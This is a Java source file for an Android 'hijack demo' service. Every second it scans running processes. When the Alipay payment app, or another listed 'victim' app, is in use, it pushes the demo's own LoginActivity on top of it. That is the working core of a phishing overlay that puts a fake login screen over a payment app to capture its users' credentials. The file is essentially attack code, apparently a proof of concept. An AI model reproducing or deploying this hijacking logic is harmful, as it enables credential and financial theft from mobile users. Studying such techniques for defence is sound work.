package datajoy.hijackdemo;

import android.app.ActivityManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.jaredrummler.android.processes.AndroidProcesses;
import com.jaredrummler.android.processes.models.AndroidAppProcess;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.SortedMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.TreeMap;

/**
 * Created by tigerlove on 16/7/14.
 */
public class HijackService extends Service {
    HashMap<String,Class<?>> mVictims = new HashMap<String,Class<?>>();
    long delay = 1000;
    long period = 1000;

    Timer mTimer = new Timer();
    TimerTask mTimerTask = new TimerTask(){

        @Override
        public void run() {
            List<String> processNames = new ArrayList<String>();
            /**
             * LOLIIPOP 以后getRunningAppProcesses只是返回自己的
             * http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag
             * https://github.com/jaredrummler/AndroidProcesses
             */
            if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                List<AndroidAppProcess> processes = AndroidProcesses.getRunningAppProcesses();
                for(AndroidAppProcess p:processes){
                    processNames.add(p.getPackageName());
                    if(p.getPackageName().equals("com.eg.android.AlipayGphone")){
                        if(((datajoy.hijackdemo.HijackApplication)getApplication()).isHasHijackStart() == false){
                            Intent dialogIntent = new Intent(getBaseContext(),LoginActivity.class);
                            //设置启动的activity位于栈顶
                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            getApplication().startActivity(dialogIntent);
                            ((datajoy.hijackdemo.HijackApplication)getApplication()).setHasHijackStart(true);
                        }
                    }
                }
//                UsageStatsManager usm = (UsageStatsManager)getSystemService(Context.USAGE_STATS_SERVICE);
//                long time = System.currentTimeMillis();
//                List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY,  time - 1000*1000, time);
//                if (appList != null && appList.size() > 0) {
//                    SortedMap<Long, UsageStats> mySortedMap = new TreeMap<Long, UsageStats>();
//                    for (UsageStats usageStats : appList) {
//                        mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);
//                    }
//                    if (mySortedMap != null && !mySortedMap.isEmpty()) {
//                        processNames.add(mySortedMap.get(mySortedMap.lastKey()).getPackageName());
//                    }
//                }


            }else{
                ActivityManager activityManager= (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
                List<ActivityManager.RunningAppProcessInfo> appProcessInfoList = activityManager.getRunningAppProcesses();

                for(ActivityManager.RunningAppProcessInfo appProcessInfo:appProcessInfoList){
                    //如果在前台
                    processNames.add(appProcessInfo.processName);
                    if(appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND){

                        //在需要劫持的list中
                        if(mVictims.containsKey(appProcessInfo.processName)){
                            if(((datajoy.hijackdemo.HijackApplication)getApplication()).isHasHijackStart() == false){
                                Intent dialogIntent = new Intent(getBaseContext(),mVictims.get(appProcessInfo.processName));
                                //设置启动的activity位于栈顶
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                getApplication().startActivity(dialogIntent);
                                ((datajoy.hijackdemo.HijackApplication)getApplication()).setHasHijackStart(true);
                            }
                        }
                    }
                }

            }

            Log.i("2333333",processNames.toString());

        }
    };

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        mTimer.schedule(mTimerTask,delay,period);
        return super.onStartCommand(intent, flags, startId);
    }
}
